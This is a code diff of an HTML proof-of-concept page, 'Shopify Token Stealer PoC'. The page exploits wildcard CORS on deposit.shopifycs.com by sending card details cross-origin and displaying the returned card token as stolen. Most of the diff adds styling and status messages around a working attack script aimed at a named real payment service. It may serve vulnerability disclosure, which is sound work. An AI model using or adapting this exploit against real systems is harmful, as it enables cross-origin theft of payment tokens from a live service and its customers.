@@ -1,15 +1,47 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>Shopify Token Stealer PoC</title>
+  <meta charset="UTF-8">
+  <title>Shopify CORS Exploit PoC</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 2rem;
+      background-color: #f4f4f4;
+      color: #333;
+    }
+    button {
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      background-color: #ff5722;
+      color: white;
+      border: none;
+      border-radius: 5px;
+    }
+    #output {
+      margin-top: 20px;
+      white-space: pre-wrap;
+      background: #fff;
+      padding: 10px;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+    }
+  </style>
 </head>
 <body>
-  <h1>Shopify Token Stealer</h1>
-  <button onclick="stealToken()">Steal Token</button>
-  <pre id="output"></pre>
+  <h1>🚨 Shopify Token Stealer PoC</h1>
+  <p>This page exploits wildcard CORS on <code>deposit.shopifycs.com</code> to fetch a card token cross-origin.</p>
+
+  <button onclick="stealToken()">🛒 Steal Token</button>
+
+  <div id="output">Click the button above to see the token.</div>
 
   <script>
     async function stealToken() {
+      const output = document.getElementById('output');
+      output.textContent = 'Sending request...';
+
       const payload = {
         number: "4111111111111111",
         name: "Attacker",
@@ -26,10 +58,10 @@
           body: JSON.stringify(payload)
         });
 
-        const json = await res.json();
-        document.getElementById("output").textContent = "Stolen token: " + JSON.stringify(json);
+        const data = await res.json();
+        output.textContent = "✅ Token successfully received:\n\n" + JSON.stringify(data, null, 2);
       } catch (err) {
-        document.getElementById("output").textContent = "Error: " + err.message;
+        output.textContent = "❌ Error: " + err.message;
       }
     }
   </script>
